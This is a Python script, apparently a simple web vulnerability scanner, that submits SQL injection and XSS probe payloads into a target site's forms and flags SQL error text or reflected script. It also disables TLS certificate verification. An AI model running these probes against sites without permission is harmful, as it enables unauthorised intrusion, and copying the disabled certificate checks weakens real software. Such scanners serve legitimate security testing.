import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Disable SSL warnings (optional)
requests.packages.urllib3.disable_warnings()

# SQL & XSS payloads
SQL_PAYLOADS = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'--"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]

def get_forms(url):
    response = requests.get(url, verify=False)
    soup = BeautifulSoup(response.content, "lxml")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    details["action"] = form.attrs.get("action", "")
    details["method"] = form.attrs.get("method", "get").lower()
    details["inputs"] = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        details["inputs"].append({"type": input_type, "name": input_name})

    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        if input["type"] == "text" and input["name"]:
            data[input["name"]] = payload
        elif input["name"]:
            data[input["name"]] = "test"

    if form_details["method"] == "post":
        return requests.post(target_url, data=data, verify=False)
    else:
        return requests.get(target_url, params=data, verify=False)

def scan_sql_injection(url):
    print("[+] Scanning for SQL Injection...")
    forms = get_forms(url)

    for form in forms:
        form_details = get_form_details(form)
        for payload in SQL_PAYLOADS:
            response = submit_form(form_details, url, payload)
            errors = ["sql", "mysql", "syntax", "oracle", "odbc"]

            for error in errors:
                if error.lower() in response.text.lower():
                    print(f"[!] SQL Injection vulnerability detected at {url}")
                    print(f"    Payload: {payload}")
                    return

def scan_xss(url):
    print("[+] Scanning for XSS...")
    forms = get_forms(url)

    for form in forms:
        form_details = get_form_details(form)
        for payload in XSS_PAYLOADS:
            response = submit_form(form_details, url, payload)
            if payload in response.text:
                print(f"[!] XSS vulnerability detected at {url}")
                print(f"    Payload: {payload}")
                return

def main():
    target_url = input("Enter target URL (e.g., http://testphp.vulnweb.com): ")
    scan_sql_injection(target_url)
    scan_xss(target_url)

if __name__ == "__main__":
    main()
